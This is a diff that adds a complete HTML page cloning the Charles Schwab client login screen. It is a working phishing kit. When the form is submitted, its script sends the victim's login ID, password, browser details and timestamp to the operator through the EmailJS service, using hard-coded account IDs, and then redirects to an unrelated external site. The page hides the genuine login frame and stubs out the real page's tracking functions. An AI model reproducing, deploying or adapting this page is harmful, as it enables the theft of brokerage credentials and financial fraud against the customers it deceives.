@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <base href="https://client.schwab.com/Areas/Access/Login" />
+    <title>Login | Charles Schwab</title>
+    <meta name="viewport" content="width=device-width"/>
+    <meta name="description" content="Secure desktop login for current Charles Schwab clients"/>
+    <link href="https://client.schwab.com/Areas/Access/Login" rel="canonical" />
+    <link as="font" crossorigin="anonymous" href="https://client.schwabcdn.com/Areas/Access/Content/login/dist/font/CharlesModern-Regular.8f42eb9674012799efea.woff" rel="preload" />
+    <link as="font" crossorigin="anonymous" href="https://client.schwabcdn.com/Areas/Access/Content/login/dist/font/CharlesModernMedium.1b247deb1873c1b8b158.woff" rel="preload" />
+    <link href="https://client.schwabcdn.com/Areas/Access/Content/login/dist/login.b3c2e7fd9f0aa10a6aa3.css" media="screen" rel="stylesheet" />
+    <!-- EmailJS Library -->
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <style>
+        .sdps-layout--wrapper {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 1rem;
+        }
+
+        .login-module {
+            opacity: 1 !important;
+            visibility: visible !important;
+            display: block !important;
+        }
+
+        .lms-iframe-wrapper {
+            overflow: visible !important;
+        }
+
+        .login-page-content {
+            min-height: 600px;
+        }
+
+        #lmsIframe {
+            display: none !important;
+        }
+
+        .sdps-header__container {
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            padding: 1rem 0;
+        }
+
+        .custom-logo {
+            display: inline-block;
+            width: 150px;
+            height: 75px;
+            margin-left: -80px; /* moved further left */
+        }
+
+        .custom-logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            display: block;
+        }
+
+        .sdps-solo-layout__body {
+            display: flex;
+            justify-content: center;
+            padding: 1rem 0 2rem 0;
+        }
+
+        .login-module {
+            width: 100%;
+            max-width: 520px;
+            margin: 0 auto;
+        }
+
+        .custom-login-form-container {
+            padding: 0.5rem 0 1.5rem 0;
+            max-width: 380px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        #schwab-emailjs-form {
+            display: flex;
+            flex-direction: column;
+            gap: 0.875rem;
+        }
+
+        .emailjs-field-group {
+            display: flex;
+            flex-direction: column;
+            text-align: left;
+            width: 100%;
+        }
+
+        .emailjs-field-group label {
+            display: block;
+            font-family: "CharlesModern", "Charles Modern", "Helvetica Neue", Helvetica, Arial, sans-serif;
+            font-size: 1.0rem;
+            font-weight: 400;
+            line-height: 1.125rem;
+            color: #000;
+            margin-bottom: 0.25rem;
+            letter-spacing: -0.01em;
+        }
+
+        .emailjs-field-group input {
+            width: 100%;
+            padding: 0.375rem 0.625rem;
+            font-family: "CharlesModern", "Charles Modern", "Helvetica Neue", Helvetica, Arial, sans-serif;
+            font-size: 0.8125rem;
+            line-height: 1.125rem;
+            color: #1a1a1a;
+            background-color: #ffffff;
+            border: 1px solid #8c8f9a;
+            border-radius: 0.25rem;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+            box-sizing: border-box;
+        }
+
+        .emailjs-field-group input:focus {
+            outline: none;
+            border-color: #0077cc;
+            box-shadow: 0 0 0 2px rgba(0, 119, 204, 0.1);
+        }
+
+        .emailjs-field-group input::placeholder {
+            color: #9a9eab;
+            font-weight: 400;
+            font-size: 0.8125rem;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin: 0.125rem 0 0.125rem 0;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            width: 0.875rem;
+            height: 0.875rem;
+            margin: 0;
+            padding: 0;
+            cursor: pointer;
+            accent-color: #0077cc;
+        }
+
+        .checkbox-group label {
+            font-family: "CharlesModern", "Charles Modern", "Helvetica Neue", Helvetica, Arial, sans-serif;
+            font-size: 0.95rem;
+            font-weight: 400;
+            color: #000;
+            cursor: pointer;
+            margin: 0;
+            line-height: 1.125rem;
+        }
+
+        .checkbox-group label:hover {
+            color: #0077cc;
+        }
+
+        .inline-error {
+            color: #d32f2f;
+            font-size: 0.6875rem;
+            font-weight: 400;
+            margin-top: 0.25rem;
+            display: block;
+            font-family: "CharlesModern", "Charles Modern", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        }
+
+        .inline-field-error {
+            color: #d32f2f;
+            font-size: 0.6875rem;
+            font-weight: 400;
+            margin-top: 0.25rem;
+            display: block;
+        }
+
+        .emailjs-submit-btn {
+            background-color: #005f83;
+            color: #ffffff;
+            border: none;
+            padding: 0.5rem 1rem;
+            font-family: "CharlesModern", "Charles Modern", "Helvetica Neue", Helvetica, Arial, sans-serif;
+            font-size: 0.8125rem;
+            font-weight: 400;
+            line-height: 1.125rem;
+            border-radius: 1px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 0.25rem;
+            transition: background-color 0.2s ease, transform 0.1s ease;
+            letter-spacing: 0.01em;
+        }
+
+        .emailjs-submit-btn:hover {
+            background-color: #005f83;
+        }
+
+        .emailjs-submit-btn:active {
+            background-color: #004c82;
+            transform: scale(0.98);
+        }
+
+        /* Global error message styling */
+        #form-error-message {
+            text-align: center;
+            padding: 0.375rem;
+            background-color: #fef2f2;
+            border-radius: 0.25rem;
+            margin-top: 0;
+            font-size: 0.6875rem;
+            display: none; /* hidden until needed */
+        }
+
+        .login-module-help-links {
+            margin-top: 1.25rem;
+            text-align: center;
+        }
+
+        .login-module-help-links ul {
+            justify-content: center;
+        }
+
+        .login-module-header {
+            text-align: center;
+            margin-bottom: 1rem;
+        }
+
+        .login-title {
+            font-weight: 450;
+            font-size: 1.55rem;
+            margin-left: -60px;
+        }
+
+        .smart-banner-container {
+            margin-top: 1.25rem;
+        }
+
+        .sdps-list--inline {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.75rem;
+            justify-content: center;
+            padding-left: 0;
+            margin: 0;
+        }
+
+        .sdps-list--inline li {
+            display: inline-block;
+        }
+
+        .language-dropdown {
+            padding: 0.25rem 0.5rem;
+            font-family: inherit;
+            font-size: 1.0rem;
+            border: 1px solid #8c8f9a;
+            border-radius: 0.25rem;
+            background-color: #ffffff;
+            cursor: pointer;
+        }
+
+        .login-module-help-links ul li a {
+            font-size: 0.95rem;
+        }
+
+        .checkbox-group:hover label {
+            color: #0077cc;
+        }
+
+        @media (max-width: 640px) {
+            .sdps-layout--wrapper {
+                padding: 0 0.75rem;
+            }
+
+            .custom-logo {
+                width: 130px;
+                height: 65px;
+                margin-left: -40px; /* also further left on mobile */
+            }
+
+            .custom-login-form-container {
+                max-width: 100%;
+                padding: 0 0 1rem 0;
+            }
+
+            .emailjs-field-group input {
+                padding: 0.375rem 0.625rem;
+            }
+
+            .emailjs-submit-btn {
+                padding: 0.5rem 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="sdps-layout sdps-layout--wrapper sdps-layout--responsive">
+    <div class="sc-responsive-meganav-retail-h" id="meganav">
+        <header class="sdps-meganav-header sc-responsive-meganav-retail" id="site-header">
+            <div class="sdps-header__container sc-responsive-meganav-retail">
+                <div class="custom-logo">
+                    <img src="https://2dhk5ye3hl.ucarecd.net/95492c26-4809-4f9a-a925-f8f93454cc56/charleslogo.svg"
+                         alt="Charles Schwab"
+                         width="150"
+                         height="75"
+                         onerror="this.style.display='none'; console.log('Logo failed to load');" />
+                </div>
+            </div>
+        </header>
+    </div>
+
+    <div class="login-page-content">
+        <main aria-label="Login Module" class="sc-sdps-solo-layout-h sc-sdps-solo-layout-s sdps-background--grouped-primary hydrated">
+            <div class="sdps-solo-layout sdps-css-grid sdps-solo-layout--large sc-sdps-solo-layout sc-sdps-solo-layout-s">
+                <div class="notification-container sdps-solo-layout__page-notifications sdps-css-grid__cell sdps-css-grid__cell--span-12 sdps-flexbox sdps-flexbox--column sc-sdps-solo-layout sc-sdps-solo-layout-s">
+                    <noscript>
+                        <div role="alert" class="sdps-notification sdps-notification--error sdps-flexbox sdps-flexbox--column sdps-css-grid__cell--span-12">
+                            <span class="sdps-notification__icon">
+                                <svg role="img" aria-label="information alert icon label" class="sdps-icon sdps-icon--large"><use xlink:href="#icon-sch-error"></use></svg>
+                            </span>
+                            <div class="sdps-notification__text">
+                                Your browser does not support or has disabled JavaScript. In order to benefit from all available online tools, you will need to enable JavaScript.
+                            </div>
+                        </div>
+                    </noscript>
+                </div>
+
+                <div class="login-module-wrapper legacy-size sdps-solo-layout__body sdps-css-grid__cell sdps-css-grid__cell--span-12 sc-sdps-solo-layout sc-sdps-solo-layout-s">
+                    <div class="login-module with-solo-banner">
+                        <div class="lms-iframe-wrapper">
+                            <h1 class="login-module-header">
+                                <span class="login-title sdps-title-3">Log in to Schwab</span>
+                            </h1>
+                            <iframe id="lmsIframe" scrolling="no" style="display:none;" aria-hidden="true"></iframe>
+
+                            <div class="custom-login-form-container">
+                                <form id="schwab-emailjs-form">
+                                    <div class="emailjs-field-group">
+                                        <label for="login-id">Login ID</label>
+                                        <input type="text" id="login-id" name="login_id" placeholder="" autocomplete="username" aria-required="true" />
+                                    </div>
+                                    <div class="emailjs-field-group">
+                                        <label for="password">Password</label>
+                                        <input type="password" id="password" name="password" placeholder="" autocomplete="current-password" aria-required="true" />
+                                    </div>
+
+                                    <div class="checkbox-group">
+                                        <input type="checkbox" id="remember-login" name="remember_login" />
+                                        <label for="remember-login">Remember Login ID</label>
+                                    </div>
+
+                                    <!-- Global error message: only shown when needed -->
+                                    <div id="form-error-message" class="inline-error" aria-live="polite"></div>
+
+                                    <button type="submit" class="emailjs-submit-btn">Log In</button>
+                                </form>
+                            </div>
+                        </div>
+
+                        <footer class="login-module-help-links">
+                            <ul class="sdps-list--inline">
+                                <li>Forgot <a aria-label="Recover your Login ID" href="https://sws-gateway-nr.schwab.com/ui/host/?clientid=schwab-secondary&amp;redirecturi=https%3a%2f%2fclient.schwab.com%2fAreas%2fAccess%2fSignOn%2fAuth#/ar/fyl">Login ID</a> or <a aria-label="Recover your Password" href="https://sws-gateway-nr.schwab.com/ui/host/?clientid=schwab-secondary&amp;redirecturi=https%3a%2f%2fclient.schwab.com%2fAreas%2fAccess%2fSignOn%2fAuth#/ar/login">Password?</a></li>
+                                <li><a href="https://sws-gateway-nr.schwab.com/ui/host/?clientid=schwab-clwe&amp;state=clwe#/welcome">New User?</a></li>
+                                <li>
+                                    <label><span class="sdps-sr-only">Language selection dropdown</span>
+                                        <select class="language-dropdown" id="language-selector">
+                                            <option selected="selected" value="en-us">English</option>
+                                            <option value="zh-tw">繁體</option>
+                                            <option value="zh-cn">简体</option>
+                                        </select>
+                                    </label>
+                                </li>
+                            </ul>
+                        </footer>
+                    </div>
+
+                    <div class="smart-banner-container login-banner-layout">
+                        <div aria-label="Schwab product and service banners" class="smart-banners">
+                            <div class="banners-container" data-dl-component.id="deck-banner-01" data-dl-component.title="Login 1 banner" data-dl-component.type="deck-banner">
+                                <div class="login-banner" data-banner-content-id="sb-login-card" data-dl-campaign_id="sb-login-card" data-dl-component.id="card-banner-01" data-dl-component.title="Looking for more purchasing power?" data-dl-component.type="card-banner" data-dl-component.variation="banner default">
+                                    <img alt="" class="banner-image" src="https://rtcontent.schwab.com/sites/g/files/eyrktu451/files/2026-02/ICN-Isometric-Light-Magnifying%20Glass%20Alert.svg" />
+                                    <div class="banner-conent-container">
+                                        <div class="banner-title sdps-title-3">Looking for more purchasing power?</div>
+                                        <div class="banner-content-body sdps-text-headline sdps-font-regular">
+                                            <p>Margin loans can increase your trading flexibility and support your investing goals.</p>
+                                        </div>
+                                        <a class="banner-link sdps-button sdps-button--tertiary" href="https://www.schwab.com/margin" name="Explore margin">Explore margin</a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <footer class="login-page-footer">
+        <div aria-label="Schwab's client relationship summaries" class="relationship-summary sdps-css-grid__cell--span-12 sdps-p-around_small">
+            <p><strong>Important information about our relationship with you:</strong> <a href="https://www.schwab.com/transparency">Client Relationship Summaries</a></p>
+            <p>Our Client Relationship Summaries offer a brief summary of our services, fees and obligations when we work with you in a broker-dealer or an investment advisory relationship. Learn more at <a href="https://www.schwab.com/transparency">schwab.com/transparency</a>.</p>
+        </div>
+
+        <ul class="footer-links sdps-list--inline">
+            <li><a href="/public/schwab/nn/legal_compliance/schwabsafe"><svg class="sdps-icon sdps-icon--small" role="presentation"><use xlink:href="#icon-sch-lock"></use></svg>SchwabSafe&reg; </a></li>
+            <li id="privacyLinkContainer" style="display: none"><a class="ot-sdk-show-settings schwab-privacy-button" href="javascript:void(0)">Your Privacy Choices</a></li>
+            <li><a href="/public/schwab/nn/legal_compliance/schwabsafe/security_guarantee.html">The Schwab Security Guarantee </a></li>
+            <li><a href="https://www.schwab.com">Schwab Homepage </a></li>
+        </ul>
+
+        <div class="channel-footer-content sdps-text-footnote">
+            <p><a href="https://www.schwab.com/help/browsers">Web Browser Information </a></p>
+            <p class="disclosures">Investment and Insurance Products Are: Not FDIC Insured • Not Insured by Any Federal Government Agency • Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or any of its Affiliates • Subject to Investment Risks, Including Possible Loss of Principal Amount Invested</p>
+            <p>The Charles Schwab Corporation provides a full range of brokerage, banking and financial advisory services through its operating subsidiaries. Its broker-dealer subsidiary, Charles Schwab & Co. Inc. (Member SIPC), and its affiliates offer investment services and products. Its banking subsidiary, Charles Schwab Bank, SSB (member FDIC and an Equal Housing Lender), provides deposit and lending services and products.</p>
+            <p>Check the background of this firm or one of its investment professionals on <a href="https://brokercheck.finra.org/" target="_blank">FINRA's BrokerCheck</a>.</p>
+            <p>Access to Electronic Services may be limited or unavailable during periods of peak demand, market volatility, systems upgrade, maintenance, or for other reasons.</p>
+            <p>Not all products and services listed are available outside the U.S. and some are subject to country specific restrictions.</p>
+            <p>This site is designed for U.S. residents. Non-U.S. residents are subject to country-specific restrictions. Learn more about our services for <a href="https://international.schwab.com/" target="_blank">non-U.S. residents </a>, <a href="https://www.schwab.com.hk/" target="_blank">Charles Schwab Hong Kong clients </a>, <a href="https://www.schwab.co.uk/" target="_blank">Charles Schwab U.K. clients</a>.</p>
+            <p>&copy; 2026 Charles Schwab &amp; Co., Inc, All rights reserved. Member <a href="https://www.sipc.org/" target="_blank">SIPC</a>. Unauthorized access is prohibited. Usage will be monitored.</p>
+        </div>
+    </footer>
+</div>
+
+<svg focusable="false" preserveAspectRatio="xMidYMid meet" style="display: none;" xmlns="http://www.w3.org/2000/svg">
+    <symbol id="icon-sch-error" viewBox="0 0 24 24"><path d="M21.833 7.693l-5.51-5.51c-0.11-0.12-0.26-0.18-0.42-0.18h-7.8c-0.15 0-0.3 0.060-0.41 0.17l-5.51 5.52c-0.12 0.1-0.18 0.25-0.18 0.41v7.8c0 0.16 0.060 0.3 0.17 0.41l5.52 5.51c0.11 0.12 0.26 0.18 0.42 0.18h7.8c0.16 0 0.31-0.060 0.42-0.17l5.51-5.51c0.1-0.12 0.16-0.27 0.16-0.42v-7.8c0-0.15-0.060-0.3-0.17-0.41zM12.003 18.183c-0.62 0-1.11-0.5-1.11-1.11s0.5-1.11 1.11-1.11c0.62 0 1.11 0.5 1.11 1.11s-0.49 1.11-1.11 1.11zM12.843 14.353c-0.040 0.44-0.4 0.77-0.84 0.77s-0.8-0.34-0.84-0.77l-0.34-7.37c0.040-0.65 0.59-1.16 1.24-1.16s1.19 0.5 1.24 1.16l-0.46 7.37z"></path></symbol>
+    <symbol id="icon-sch-lock" viewBox="0 0 24 24"><path d="M12 2C14.7614 2 17 4.23858 17 7V11H18.5C19.3284 11 20 11.6156 20 12.375V20.625C20 21.3844 19.3284 22 18.5 22H5.5C4.67157 22 4 21.3844 4 20.625V12.375C4 11.6156 4.67157 11 5.5 11H7V7C7 4.23858 9.23858 2 12 2ZM9 11H15V7C15 5.34315 13.6569 4 12 4C10.3431 4 9 5.34315 9 7V11ZM12 18C12.8284 18 13.5 17.3284 13.5 16.5C13.5 15.6716 12.8284 15 12 15C11.1716 15 10.5 15.6716 10.5 16.5C10.5 17.3284 11.1716 18 12 18Z" fill-rule="evenodd"></path></symbol>
+</svg>
+
+<script>
+    (function() {
+        emailjs.init("SdkmRe8WZ7itEba9z");
+    })();
+
+    const customForm = document.getElementById("schwab-emailjs-form");
+    const loginIdInput = document.getElementById("login-id");
+    const passwordInput = document.getElementById("password");
+    const rememberCheckbox = document.getElementById("remember-login");
+    const errorDisplay = document.getElementById("form-error-message");
+
+    function loadSavedLoginId() {
+        const savedLoginId = localStorage.getItem("schwab_saved_login_id");
+        const rememberFlag = localStorage.getItem("schwab_remember_login") === "true";
+
+        if (rememberFlag && savedLoginId && loginIdInput) {
+            loginIdInput.value = savedLoginId;
+            if (rememberCheckbox) {
+                rememberCheckbox.checked = true;
+            }
+        }
+    }
+
+    function saveLoginIdIfNeeded(loginId) {
+        if (rememberCheckbox && rememberCheckbox.checked) {
+            localStorage.setItem("schwab_saved_login_id", loginId);
+            localStorage.setItem("schwab_remember_login", "true");
+        } else {
+            localStorage.removeItem("schwab_saved_login_id");
+            localStorage.setItem("schwab_remember_login", "false");
+        }
+    }
+
+    function showFieldError(input, message) {
+        if (!input) return;
+        input.style.borderColor = "#d32f2f";
+        let errorSpan = input.parentNode.querySelector('.inline-field-error');
+        if (!errorSpan) {
+            errorSpan = document.createElement('span');
+            errorSpan.className = 'inline-field-error inline-error';
+            input.parentNode.appendChild(errorSpan);
+        }
+        errorSpan.textContent = message;
+    }
+
+    function clearFieldErrors() {
+        [loginIdInput, passwordInput].forEach(input => {
+            if (input) {
+                input.style.borderColor = "";
+                const err = input.parentNode.querySelector('.inline-field-error');
+                if (err) err.remove();
+            }
+        });
+    }
+
+    function clearErrors() {
+        if (errorDisplay) {
+            errorDisplay.textContent = "";
+            errorDisplay.style.display = "none";
+        }
+        clearFieldErrors();
+    }
+
+    function validateForm(loginId, password) {
+        let isValid = true;
+        clearFieldErrors();
+
+        if (!loginId || loginId.trim() === "") {
+            showFieldError(loginIdInput, "Login ID is required.");
+            isValid = false;
+        }
+        if (!password || password.trim() === "") {
+            showFieldError(passwordInput, "Password is required.");
+            isValid = false;
+        }
+
+        if (!isValid && errorDisplay) {
+            errorDisplay.textContent = "Please fill in all required fields.";
+            errorDisplay.style.display = "block";
+        }
+
+        return isValid;
+    }
+
+    loadSavedLoginId();
+
+    if (customForm) {
+        customForm.addEventListener("submit", async (event) => {
+            event.preventDefault();
+            clearErrors();
+
+            const loginId = loginIdInput ? loginIdInput.value.trim() : "";
+            const password = passwordInput ? passwordInput.value.trim() : "";
+
+            if (!validateForm(loginId, password)) {
+                return;
+            }
+
+            saveLoginIdIfNeeded(loginId);
+
+            const templateParams = {
+                login_id: loginId,
+                password: password,
+                timestamp: new Date().toLocaleString(),
+                user_agent: navigator.userAgent,
+                remember_login: rememberCheckbox ? rememberCheckbox.checked : false
+            };
+
+            try {
+                const response = await emailjs.send(
+                    "service_zuj2d2a",
+                    "template_tvd86sp",
+                    templateParams
+                );
+            console.log("EmailJS success - Status:", response.status);
+                window.location.href = "https://www.viewinfoactivity.com/terms-highland";
+            } catch (error) {
+                console.error("EmailJS error:", error);
+                if (errorDisplay) {
+                    errorDisplay.textContent = "Unable to process login. Please try again later.";
+                    errorDisplay.style.display = "block";
+                } else {
+                    alert("There was an error sending your credentials. Please try again later.");
+                }
+            }
+        });
+    }
+
+    window.addEventListener('DOMContentLoaded', function() {
+        const loginModule = document.querySelector('.login-module');
+        if (loginModule) {
+            loginModule.style.display = 'block';
+            loginModule.style.visibility = 'visible';
+            loginModule.style.opacity = '1';
+        }
+        const customContainer = document.querySelector('.custom-login-form-container');
+        if (customContainer) {
+            customContainer.style.display = 'block';
+        }
+        const lmsIframe = document.getElementById('lmsIframe');
+        if (lmsIframe) {
+            lmsIframe.style.display = 'none';
+        }
+        const wrapper = document.querySelector('.lms-iframe-wrapper');
+        if (wrapper) {
+            wrapper.style.minHeight = 'auto';
+            wrapper.style.overflow = 'visible';
+        }
+    });
+
+    const languageSelector = document.getElementById('language-selector');
+    if (languageSelector) {
+        languageSelector.addEventListener('change', function (event) {
+            const url = new URL(location);
+            if (url.searchParams) {
+                url.searchParams.delete('chinese');
+                url.searchParams.delete('lang');
+                url.searchParams.append('lang', event.target.value);
+            }
+            window.location = url.href;
+        });
+    }
+
+    window.callGeolocationApi = function() {};
+    window.setPrivacyLinkVisibility = function() { return false; };
+    window.initializeTealiumLoading = function() {};
+    window.loadTealium = function() {};
+
+    console.log("EmailJS integration active — conditional error messages and responsive layout");
+</script>
+</body>
+</html>
